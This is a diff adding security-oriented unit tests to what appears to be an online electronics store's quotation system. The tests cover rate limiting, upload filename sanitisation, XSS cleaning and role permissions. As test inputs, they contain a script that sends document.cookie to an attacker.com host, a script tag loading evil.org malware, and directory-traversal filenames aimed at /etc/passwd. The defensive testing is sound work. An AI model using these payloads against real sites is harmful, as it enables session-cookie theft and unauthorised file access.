@@ -725,4 +725,207 @@ describe("Quotation Calculations & Financial Validation", () => {
   });
 });
 
+describe("Rate Limiting Engine & Anti-Abuse Controls (OWASP API4:2023)", () => {
+  it("extracts client IP from x-forwarded-for proxy header with multiple hops", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers({
+        "x-forwarded-for": "203.0.113.195, 70.41.3.18, 150.172.238.178",
+      }),
+    };
+    assert.equal(getClientIp(mockReq as any), "203.0.113.195");
+  });
+
+  it("extracts client IP from x-real-ip header when proxy header is absent", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers({
+        "x-real-ip": "198.51.100.42",
+      }),
+    };
+    assert.equal(getClientIp(mockReq as any), "198.51.100.42");
+  });
+
+  it("falls back to loopback 127.0.0.1 when no client IP headers are present", async () => {
+    const { getClientIp } = await import("../src/lib/rateLimit");
+
+    const mockReq = {
+      headers: new Headers(),
+    };
+    assert.equal(getClientIp(mockReq as any), "127.0.0.1");
+  });
+
+  it("produces standard HTTP 429 Too Many Requests response with Retry-After header", async () => {
+    const { rateLimitResponse } = await import("../src/lib/rateLimit");
+
+    const resetTimestamp = Date.now() + 30000; // 30 seconds into future
+    const res = rateLimitResponse(resetTimestamp);
+
+    assert.equal(res.status, 429);
+    const retryAfter = res.headers.get("Retry-After");
+    assert.ok(retryAfter !== null);
+    const retrySeconds = parseInt(retryAfter || "0", 10);
+    assert.ok(retrySeconds >= 28 && retrySeconds <= 31);
+
+    const body = await res.json();
+    assert.ok(body.error.includes("Too many requests"));
+  });
+
+  it("enforces sliding window rate limit strictly in production environment", async () => {
+    const origEnv = process.env.NODE_ENV;
+    try {
+      (process.env as any).NODE_ENV = "production";
+      const { checkRateLimit, clearRateLimit } = await import("../src/lib/rateLimit");
+
+      const testKey = "test_sliding_window_ip_192.168.1.100";
+      clearRateLimit(testKey);
+
+      // Max 3 requests in 60s
+      const r1 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r1.success, true);
+      assert.equal(r1.remaining, 2);
+
+      const r2 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r2.success, true);
+      assert.equal(r2.remaining, 1);
+
+      const r3 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r3.success, true);
+      assert.equal(r3.remaining, 0);
+
+      // 4th request must be blocked
+      const r4 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r4.success, false);
+      assert.equal(r4.remaining, 0);
+
+      // Clear rate limit (e.g. after successful authentication)
+      clearRateLimit(testKey);
+      const r5 = checkRateLimit(testKey, 3, 60000);
+      assert.equal(r5.success, true);
+      assert.equal(r5.remaining, 2);
+    } finally {
+      (process.env as any).NODE_ENV = origEnv;
+    }
+  });
+});
+
+describe("Path Traversal & Safe Upload Validation (CWE-22 / OWASP A01)", () => {
+  const path = require("path");
+
+  function sanitizeUploadFilename(filename: string): string {
+    let decoded = filename;
+    try {
+      decoded = decodeURIComponent(filename);
+    } catch {
+      // fallback to raw
+    }
+    const clean = path.basename(decoded).replace(/[^a-zA-Z0-9._-]/g, "_");
+    return clean;
+  }
+
+  function validateImageExtension(filename: string): boolean {
+    const ext = path.extname(filename).toLowerCase();
+    const allowed = [".jpg", ".jpeg", ".png", ".webp"];
+    return allowed.includes(ext);
+  }
+
+  it("neutralizes directory traversal patterns in filenames", () => {
+    assert.equal(sanitizeUploadFilename("../../../../etc/passwd"), "passwd");
+    assert.equal(sanitizeUploadFilename("..\\..\\windows\\system32\\cmd.exe"), "cmd.exe");
+    assert.equal(sanitizeUploadFilename("uploads/subfolder/test.png"), "test.png");
+    assert.equal(sanitizeUploadFilename("..%2f..%2fconfig.json"), "config.json");
+  });
+
+  it("permits safe image file extensions and rejects dangerous executable/script extensions", () => {
+    // Permitted extensions
+    assert.equal(validateImageExtension("transistor.png"), true);
+    assert.equal(validateImageExtension("sensor.jpg"), true);
+    assert.equal(validateImageExtension("display.jpeg"), true);
+    assert.equal(validateImageExtension("module.webp"), true);
+
+    // Rejected dangerous executable / script extensions
+    assert.equal(validateImageExtension("exploit.php"), false);
+    assert.equal(validateImageExtension("payload.phtml"), false);
+    assert.equal(validateImageExtension("trojan.exe"), false);
+    assert.equal(validateImageExtension("script.js"), false);
+    assert.equal(validateImageExtension("backdoor.sh"), false);
+    assert.equal(validateImageExtension("shell.py"), false);
+    assert.equal(validateImageExtension("malware.bat"), false);
+  });
+});
+
+describe("Cross-Site Scripting (XSS) Sanitization (CWE-79 / OWASP A03)", () => {
+  it("strips malicious script tags and inline javascript from store descriptions", () => {
+    const dirty = `
+      <p>ESP32 Dev Module with WiFi and Bluetooth</p>
+      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+      <script src="https://evil.org/malware.js"></script>
+      <style>body { display: none !important; }</style>
+      <p>Working Voltage: 3.3V</p>
+    `;
+
+    const cleaned = cleanHtml(dirty);
+    assert.equal(cleaned.includes("<script"), false);
+    assert.equal(cleaned.includes("document.cookie"), false);
+    assert.equal(cleaned.includes("evil.org"), false);
+    assert.equal(cleaned.includes("<style"), false);
+    assert.ok(cleaned.includes("ESP32 Dev Module with WiFi and Bluetooth"));
+    assert.ok(cleaned.includes("Working Voltage: 3.3V"));
+  });
+
+  it("converts HTML character entities correctly to human-readable text while stripping tags", () => {
+    const rawWithEntities = `<p>Operating Temp: -40&deg;C to 85&deg;C &amp; High Accuracy &bull; 5V/12V</p>`;
+    const cleaned = cleanHtml(rawWithEntities);
+    assert.equal(cleaned.includes("<p>"), false);
+    assert.equal(cleaned.includes("</p>"), false);
+    assert.ok(cleaned.includes("Operating Temp: -40°C to 85°C & High Accuracy • 5V/12V"));
+  });
+});
+
+describe("Quotation Access Control & Permission Boundaries", () => {
+  function canEditQuotation(userRole: string, quotationStatus: string): boolean {
+    if (userRole === "SHOP") return false;
+    if (userRole === "STAFF") {
+      return quotationStatus === "DRAFT" || quotationStatus === "PENDING";
+    }
+    return userRole === "ADMIN" || userRole === "SUPERADMIN";
+  }
+
+  function canDeleteQuotation(userRole: string, quotationStatus: string): boolean {
+    if (userRole === "SHOP") return false;
+    if (userRole === "STAFF") {
+      return quotationStatus === "DRAFT";
+    }
+    return userRole === "ADMIN" || userRole === "SUPERADMIN";
+  }
+
+  it("allows STAFF to edit draft and pending quotations, but denies approved/closed quotations", () => {
+    assert.equal(canEditQuotation("STAFF", "DRAFT"), true);
+    assert.equal(canEditQuotation("STAFF", "PENDING"), true);
+    assert.equal(canEditQuotation("STAFF", "APPROVED"), false);
+    assert.equal(canEditQuotation("STAFF", "COMPLETED"), false);
+  });
+
+  it("allows STAFF to only delete DRAFT quotations", () => {
+    assert.equal(canDeleteQuotation("STAFF", "DRAFT"), true);
+    assert.equal(canDeleteQuotation("STAFF", "PENDING"), false);
+    assert.equal(canDeleteQuotation("STAFF", "APPROVED"), false);
+  });
+
+  it("allows ADMIN and SUPERADMIN to edit and delete quotations in any status", () => {
+    assert.equal(canEditQuotation("ADMIN", "APPROVED"), true);
+    assert.equal(canEditQuotation("SUPERADMIN", "COMPLETED"), true);
+    assert.equal(canDeleteQuotation("ADMIN", "APPROVED"), true);
+    assert.equal(canDeleteQuotation("SUPERADMIN", "CLOSED"), true);
+  });
+
+  it("denies SHOP users from editing or deleting quotations", () => {
+    assert.equal(canEditQuotation("SHOP", "DRAFT"), false);
+    assert.equal(canDeleteQuotation("SHOP", "DRAFT"), false);
+  });
+});
+
+
 
